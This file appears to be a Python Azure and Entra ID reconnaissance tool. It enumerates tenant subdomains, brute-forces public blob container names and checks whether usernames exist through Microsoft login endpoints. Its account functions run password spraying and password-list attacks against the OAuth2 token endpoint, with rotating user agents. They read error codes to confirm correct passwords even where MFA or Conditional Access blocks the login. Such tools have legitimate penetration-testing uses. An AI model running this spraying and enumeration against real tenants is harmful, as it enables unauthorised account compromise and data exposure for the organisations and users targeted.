import argparse
import socket
import sys
import random
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
import requests

if sys.platform == "win32" and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass


YELLOW = "\033[33m"
RESET = "\033[0m"
GREEN = "\033[32m"
BLUE = "\033[0;36m"
RED = "\033[31m"

AZURE_DNS = {
    "Virtual Machines / Cloud Services": ".cloudapp.azure.com",
    "App Service / Functions": ".azurewebsites.net",
    "App Service Kudu Console": ".scm.azurewebsites.net",
    "Container Instances": ".azurecontainer.io",
    "Container Registry": ".azurecr.io",
    "Front Door": ".azurefd.net",
    "Blob Storage": ".blob.core.windows.net",
    "Files": ".file.core.windows.net",
    "Queue Storage": ".queue.core.windows.net",
    "Table Storage": ".table.core.windows.net",
    "Data Lake Storage Gen2": ".dfs.core.windows.net",
    "Static Website Hosting": ".web.core.windows.net",
    "SQL Database": ".database.windows.net",
    "Cosmos DB": ".documents.azure.com",
    "Database for PostgreSQL": ".postgres.database.azure.com",
    "Database for MySQL": ".mysql.database.azure.com",
    "Cache for Redis": ".redis.cache.windows.net",
    "Traffic Manager": ".trafficmanager.net",
    "Key Vault": ".vault.azure.net",
    "Service Bus": ".servicebus.windows.net",
    "Event Hubs": ".eventhub.windows.net",
    "API Management": ".azure-api.net",
    "Microsoft Entra ID Tenant": ".onmicrosoft.com",
    "Microsoft Entra ID Authentication": ".login.microsoftonline.com",
    "Resource Manager API": ".management.azure.com",
    "Kubernetes Service Control Plane": ".hcp.azmk8s.io",
    "Kubernetes Service Application Routing": ".aksapp.io",
}

def parse_arguments():
    parser = argparse.ArgumentParser()
    if len(sys.argv) == 1:
        parser.error("no arguments provided")
    parser.add_argument("-S", '--subdomain', metavar="TENANT", help="Enumerate services and subdomains for a tenant")
    parser.add_argument("-B", '--blob', metavar="TENANT", help='Enumerate Blob Containers')
    parser.add_argument("-T", '--tenant', metavar="TENANT", help="Enumerate tenant metadata and OpenID configuration")
    parser.add_argument("-u", "--username", metavar="DOMAIN", help="Enumerate a username on a tenant passively")
    parser.add_argument("-U", "--userlist", metavar="PATH", help="Path to username wordlist")
    parser.add_argument('-p', "--password", metavar="PASSWORD", help="Enumerate a user account on a tenant with password")
    parser.add_argument('-P', "--passlist", metavar="PATH", help="Path to password wordlist")
    return parser.parse_args()


def print_banner():
    banner = r'''                                    
      ▄▄▄▄   ▄▄▄▄▄▄▄▄▄                   
    ▄██▀▀██▄ ▀▀▀▀▀████                   
    ███  ███    ▄███▀  ▄█▀█▄ ██ ██ ▄█▀▀▀ 
    ███▀▀███  ▄███▀    ██▄█▀ ██ ██ ▀███▄ 
    ███  ███ █████████ ▀█▄▄▄ ▀██▀█ ▄▄▄█▀ 
                                                        
    '''
    print(BLUE + banner + RESET)
    print(BLUE + "[=] Azure Enumeration & Reconnaissance Tool by Kavin Jindal" + RESET)
    print(BLUE + "[=] Github: https://github.com/kavin-jindal" + RESET)


def query_user_realm(login):
    url = f"https://login.microsoftonline.com/getuserrealm.srf?login={login}&json=1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    try:
        resp = requests.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            return resp.json()
    except Exception:
        pass
    return {}


def query_autodiscover(email):
    url = f"https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{email}?Protocol=res"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    }
    try:
        resp = requests.get(url, headers=headers, allow_redirects=False, timeout=6)
        loc = resp.headers.get("Location")
        if resp.status_code == 302 and loc:
            parsed = urlparse(loc)
            target = parsed.netloc or loc
            return f"Redirected (302) -> {target}"

        try:
            body = resp.json()
            err = body.get("ErrorCode")
        except Exception:
            err = None

        if err == "Protocol_UnsupportedProtocol" or resp.status_code == 404:
            rest_url = f"https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/{email}?Protocol=REST"
            r_rest = requests.get(rest_url, headers=headers, allow_redirects=False, timeout=6)
            rest_loc = r_rest.headers.get("Location")
            if rest_loc:
                parsed_rest = urlparse(rest_loc)
                target = parsed_rest.netloc or rest_loc
                return f"Redirected (302) -> {target}"
            return "No Mailbox / Not Hosted on Exchange Online"

        if resp.status_code == 200:
            return "Valid Exchange Online Mailbox"

        return f"HTTP {resp.status_code}"
    except Exception as e:
        return f"Unavailable ({e.__class__.__name__})"


def interpret_credential_data(response_data, realm_data=None, autodiscover_data=None):
    ests = response_data.get("EstsProperties") or {}
    creds = response_data.get("Credentials") or {}
    branding_list = ests.get("UserTenantBranding") or []
    realm_data = realm_data or {}

    # account existence
    if_exists = response_data.get("IfExistsResult")
    if_exists_map = {
        0: "Account exists (Valid User)",
        1: "Account does not exist",
        5: "Account or domain does not exist",
        6: "Domain not registered in Microsoft Entra ID",
    }
    account_status = if_exists_map.get(if_exists, f"Unknown status code ({if_exists})")

    # realm & tenant brand name 
    brand_name = realm_data.get("FederationBrandName")
    brand_status = brand_name if brand_name else "Not configured"

    # domain architecture & Realm Type
    domain_type = ests.get("DomainType")
    domain_type_map = {
        1: "Unknown",
        2: "Federated (Authenticates via external IdP e.g., ADFS, Okta)",
        3: "Managed / Cloud-Only (Authenticates directly with Microsoft Entra ID)",
        4: "Hybrid / Managed",
    }
    if domain_type in domain_type_map:
        domain_status = domain_type_map[domain_type]
    elif realm_data.get("NameSpaceType"):
        domain_status = f"{realm_data.get('NameSpaceType')} (via UserRealm)"
    else:
        domain_status = "Not available"

    # federation redirect
    fed_url = response_data.get("FederationRedirectUrl") or realm_data.get("AuthURL")
    fed_status = fed_url if fed_url else "None (Direct Microsoft authentication)"

    # autodiscover routing
    autodiscover_status = autodiscover_data or "Not available"

    # preferred credential
    pref_cred = creds.get("PrefCredential")
    pref_cred_map = {
        1: "Password authentication",
        2: "Federation / External IdP",
        3: "Certificate-based authentication",
        4: "FIDO2 security key",
        5: "Windows Hello / Remote NGC",
    }
    pref_cred_status = pref_cred_map.get(pref_cred, f"Type {pref_cred}" if pref_cred is not None else "Not available")

    # password status
    has_pwd = creds.get("HasPassword")
    if has_pwd is True:
        has_pwd_status = "Yes (Password authentication enabled on this account)"
    elif has_pwd is False:
        has_pwd_status = "No (Passwordless or no password configured)"
    else:
        has_pwd_status = "Unknown"

    # alternate authentication methods
    alt_methods = []
    if creds.get("FidoParams"):
        alt_methods.append("FIDO2 Security Key")
    if creds.get("CertAuthParams"):
        alt_methods.append("Certificate Auth")
    if creds.get("RemoteNgcParams"):
        alt_methods.append("Windows Hello (Remote NGC)")
    if creds.get("GoogleParams"):
        alt_methods.append("Google Federation")
    if creds.get("FacebookParams"):
        alt_methods.append("Facebook Federation")
    alt_auth_status = ", ".join(alt_methods) if alt_methods else "None advertised (Standard login flow)"

    # tenant governance
    is_unmanaged = response_data.get("IsUnmanaged")
    if is_unmanaged is True:
        tenant_mgmt = "Unmanaged / Viral Tenant (Self-created, no IT admin takeover)"
    elif is_unmanaged is False:
        tenant_mgmt = "Managed Tenant (Formally administered by IT organization)"
    else:
        tenant_mgmt = "Unknown"

    # self-service signup
    signup_disallowed = response_data.get("IsSignupDisallowed")
    if signup_disallowed is True:
        signup_status = "Disabled (Users cannot self-register accounts in this domain)"
    elif signup_disallowed is False:
        signup_status = "Enabled (Self-service user registration is allowed)"
    else:
        signup_status = "Unknown"

    # throttling
    throttle = response_data.get("ThrottleStatus")
    throttle_status = "Rate limited by Microsoft (Throttled)" if throttle == 1 else "Normal (Not throttled)"

    branding_theme = "Default Microsoft branding"
    kmsi_status = "Not specified"
    sspr_status = "Not specified"

    if branding_list:
        first_branding = branding_list[0]
        bg = first_branding.get("BackgroundColor")
        if bg and bg.lower() != "#ffffff":
            branding_theme = f"Custom background color ({bg})"
        else:
            branding_theme = "Default Microsoft theme"

        kmsi_disabled = first_branding.get("KeepMeSignedInDisabled")
        if kmsi_disabled is False:
            kmsi_status = "Allowed ('Stay signed in' prompt enabled)"
        elif kmsi_disabled is True:
            kmsi_status = "Disabled ('Stay signed in' prompt suppressed)"

        layout = first_branding.get("LayoutTemplateConfig") or {}
        hide_pwd = layout.get("hideForgotMyPassword")
        hide_cant_access = layout.get("hideCantAccessYourAccount")
        if hide_pwd is False or hide_cant_access is False:
            sspr_status = "Visible (Self-service recovery links shown)"
        elif hide_pwd is True and hide_cant_access is True:
            sspr_status = "Hidden (Self-service recovery links disabled)"

    return [
        ("Account Validity", account_status),
        ("Tenant Brand Name", brand_status),
        ("Identity Architecture", domain_status),
        ("Federation STS URL", fed_status),
        ("Autodiscover Routing", autodiscover_status),
        ("Primary Credential", pref_cred_status),
        ("Password Enabled", has_pwd_status),
        ("Alternative Auth", alt_auth_status),
        ("Tenant Governance", tenant_mgmt),
        ("Self-Service Signup", signup_status),
        ("Rate Limiting", throttle_status),
        ("Portal Branding", branding_theme),
        ("Keep Me Signed In", kmsi_status),
        ("Password Reset (SSPR)", sspr_status),
    ]


def enumerate_username(username):
    url = "https://login.microsoftonline.com/common/GetCredentialType"
    payload = {
        "username": username,
        "isOtherIdpSupported": True,
    }
    headers = {
        "Content-Type": "application/json",
    }

    try:
        resp = requests.post(url, json=payload, headers=headers)
        response_data = resp.json()
    except Exception as e:
        print(f"\t{RED}[!] Error querying Microsoft login API: {e}{RESET}")
        return

    # Query getuserrealm.srf & autodiscover endpoints
    realm_data = query_user_realm(username)
    autodiscover_data = query_autodiscover(username)

    print(f"\n\t{YELLOW}[!] Username Enumeration{RESET}")

    if_exists = response_data.get("IfExistsResult")
    if if_exists == 0:
        print(f"\t{GREEN}[+] Account Exists: {username}{RESET}")
    else:
        print(f"\t{RED}[!] Account Does Not Exist / Invalid: {username}{RESET}")

    # Key Findings section
    findings = interpret_credential_data(response_data, realm_data, autodiscover_data)
    print(f"\n\t{YELLOW}[*] Key Findings{RESET}")
    field_width = max(len(label) for label, _ in findings)
    for label, text in findings:
        print(f"\t    {BLUE}{label:<{field_width}}{RESET} : {GREEN}{text}{RESET}")


def enumerate_tenant(tenant):
    domain = tenant if ("." in tenant) else f"{tenant}.onmicrosoft.com"
    print(f"\n\t{YELLOW}[!] Tenant Enumeration for: {domain}{RESET}")

    realm_data = query_user_realm(domain)
    autodiscover_data = query_autodiscover(f"autodiscover@{domain}")

    # Query OpenID configuration for Tenant ID (Directory ID)
    tenant_id = "Not available"
    try:
        oidc_url = f"https://login.microsoftonline.com/{domain}/v2.0/.well-known/openid-configuration"
        oidc_resp = requests.get(oidc_url, timeout=5)
        if oidc_resp.status_code == 200:
            token_endpoint = oidc_resp.json().get("token_endpoint", "")
            parts = token_endpoint.split("/")
            if len(parts) >= 4 and parts[3] != "common":
                tenant_id = parts[3]
    except Exception:
        pass

    brand_name = realm_data.get("FederationBrandName") or "Not configured"
    namespace_type = realm_data.get("NameSpaceType") or "Unknown"
    auth_url = realm_data.get("AuthURL") or "None (Direct Microsoft authentication)"
    cloud_instance = realm_data.get("CloudInstanceName") or "microsoftonline.com"

    findings = [
        ("Tenant Domain", domain),
        ("Tenant ID (Directory ID)", tenant_id),
        ("Tenant Brand Name", brand_name),
        ("Namespace Type", namespace_type),
        ("Cloud Instance", cloud_instance),
        ("Federation STS URL", auth_url),
        ("Autodiscover Routing", autodiscover_data),
    ]

    print(f"\n\t{YELLOW}[*] Key Findings{RESET}")
    field_width = max(len(label) for label, _ in findings)
    for label, text in findings:
        print(f"\t    {BLUE}{label:<{field_width}}{RESET} : {GREEN}{text}{RESET}")


def enumerate_userlist(filepath):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"\t{RED}[!] Error reading userlist {filepath}: {e}{RESET}")
        return

    print(f"\n\t{YELLOW}[!] Enumerating {len(users)} users from {filepath}{RESET}")
    for user in users:
        enumerate_username(user)
def enumerate_subdomains(target):
    valid_resource = {}
    for service, suffix in AZURE_DNS.items():
        try:
            socket.getaddrinfo(
                f"{target}{suffix}",
                0,
                socket.AF_UNSPEC,
                socket.SOCK_STREAM,
            )
            valid_resource[service] = f"{target}{suffix}"
        except Exception:
            pass

    print(f"\n\t{YELLOW}[!] Valid Services and Subdomains\n{RESET}")
    for service, resource in valid_resource.items():
        spacing = 30 - len(service)
        print(GREEN + "\t[+] ", service, " " * spacing + " -> ", resource + RESET)

    return "Blob Storage" in valid_resource


def enumerate_containers(subdomain):
    subdomain=f"{subdomain}.blob.core.windows.net"
    public_file_discovery = "?restype=container&comp=list"
    with open("wordlist.txt", "r") as wordlist:
        content = wordlist.readlines()

    print(YELLOW + "\n\t[!] Discovered Containers" + RESET)
    for container in content:
        container = container.strip("\n")
        target = f"https://{subdomain}/{container}"
        response = requests.get(url=f"{target}/{public_file_discovery}")
        if response.status_code not in [404, 400]:
            print(GREEN + f"\n\t[+] {container}" + RESET)
            xml_resp = ET.fromstring(response.text)
            blobs = xml_resp.find("Blobs").findall("Blob")
            for blob in blobs:
                print("\t" + YELLOW + " > " + blob.find("Url").text + RESET)
def enumerate_account(username, password, verbose=True):
    domain = username.split("@")[-1] if "@" in username else "organizations"
    url = f"https://login.microsoftonline.com/{domain}/oauth2/token"

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    ]
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": random.choice(user_agents),
    }
    payload = {
        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
        "client_info": 1,
        "resource": "https://graph.windows.net",
        "username": username,
        "password": password,
        "grant_type": "password",
        "scope": "openid",
    }

    try:
        resp = requests.post(url, headers=headers, data=payload, timeout=8)
        response_data = resp.json()
    except Exception as e:
        if verbose:
            print(f"\t{RED}[!] Error requesting token endpoint for {username}: {e}{RESET}")
        return {"success": False, "exists": False, "error": str(e)}

    # HTTP 200: Authentication succeeded
    if resp.status_code == 200 and "access_token" in response_data:
        if verbose:
            print(f"\n\t{YELLOW}[*] Account Findings: {username}{RESET}")
            print(f"\t    {BLUE}Account Status  {RESET} : {GREEN}Exists{RESET}")
            print(f"\t    {BLUE}Password Status {RESET} : {GREEN}Valid (Login Successful){RESET}")
        return {"success": True, "exists": True, "code": 0, "token": response_data.get("access_token")}

    # Parse error response
    raw_error_codes = response_data.get("error_codes") or []
    error_desc = response_data.get("error_description", "")
    error_code = raw_error_codes[0] if raw_error_codes else None

    # Fallback to regex extraction if error_codes array was omitted
    if error_code is None and "AADSTS" in error_desc:
        import re
        match = re.search(r"AADSTS(\d+)", error_desc)
        if match:
            error_code = int(match.group(1))

    # If account is invalid / does not exist
    if error_code in [50034, 50059]:
        if verbose:
            print(f"\n\t{RED}[-] Account Does Not Exist / Invalid: {username}{RESET}")
        return {"success": False, "exists": False, "code": error_code}

    # If account exists
    if verbose:
        print(f"\n\t{YELLOW}[*] Account Findings: {username}{RESET}")
        print(f"\t    {BLUE}Account Status  {RESET} : {GREEN}Exists{RESET}")

        if error_code == 50126:
            print(f"\t    {BLUE}Password Status {RESET} : {YELLOW}Incorrect{RESET}")
        elif error_code == 50053:
            print(f"\t    {BLUE}Account State   {RESET} : {YELLOW}Locked Out{RESET}")
        elif error_code == 50057:
            print(f"\t    {BLUE}Account State   {RESET} : {RED}Disabled{RESET}")
        elif error_code == 50055:
            print(f"\t    {BLUE}Password Status {RESET} : {YELLOW}Expired{RESET}")
        elif error_code == 50056:
            print(f"\t    {BLUE}Password Status {RESET} : {YELLOW}No Password Set{RESET}")
        elif error_code in [50076, 50079]:
            print(f"\t    {BLUE}Password Status {RESET} : {GREEN}Correct (MFA Required){RESET}")
        elif error_code in [53003, 50158]:
            print(f"\t    {BLUE}Password Status {RESET} : {GREEN}Correct (Blocked by Conditional Access){RESET}")
        elif error_code == 65001:
            print(f"\t    {BLUE}Password Status {RESET} : {GREEN}Correct (Consent Required){RESET}")
        elif error_code == 50088:
            print(f"\t    {BLUE}Account State   {RESET} : {YELLOW}MFA Telecom Call Limit Exceeded{RESET}")
        elif error_code == 50131:
            print(f"\t    {BLUE}Password Status {RESET} : {GREEN}Correct (Device Not Compliant){RESET}")
        else:
            print(f"\t    {BLUE}Password Status {RESET} : {YELLOW}Incorrect / Auth Failed{RESET}")

    return {
        "success": False,
        "exists": True,
        "code": error_code,
    }


enumerate_users = enumerate_account


def enumerate_account_userlist(userlist, password):
    try:
        with open(userlist, "r", encoding="utf-8") as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"\t{RED}[!] Error reading userlist {userlist}: {e}{RESET}")
        return

    print(f"\n\t{YELLOW}[!] Enumerating {len(users)} accounts from {userlist} with password spray{RESET}")
    for user in users:
        enumerate_account(user, password)


def enumerate_account_passlist(username, passlist):
    try:
        with open(passlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"\t{RED}[!] Error reading passlist {passlist}: {e}{RESET}")
        return

    print(f"\n\t{YELLOW}[!] Spraying {len(passwords)} passwords against account: {username}{RESET}")
    for pwd in passwords:
        result = enumerate_account(username, pwd)
        # If valid credentials or account locked, stop spraying
        if result.get("success") or result.get("code") in [50053, 50076, 50079]:
            break

def main():
    print_banner()
    args = parse_arguments()
    blob_storage = args.subdomain
    container = args.blob
    tenant = args.tenant
    username = args.username
    password = args.password
    userlist = args.userlist
    passlist = args.passlist
    if blob_storage:
        enumerate_subdomains(blob_storage)
    if container:
        enumerate_containers(container)    
    if tenant:
        enumerate_tenant(tenant)    
    if username and not password and not passlist:
        enumerate_username(username)
    if username and password and not passlist: 
        enumerate_account(username, password)
    if userlist and password and not passlist:
        enumerate_account_userlist(userlist, password)
    if username and passlist:
        enumerate_account_passlist(username, passlist)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(RED + "\n[!] Terminated." + RESET)
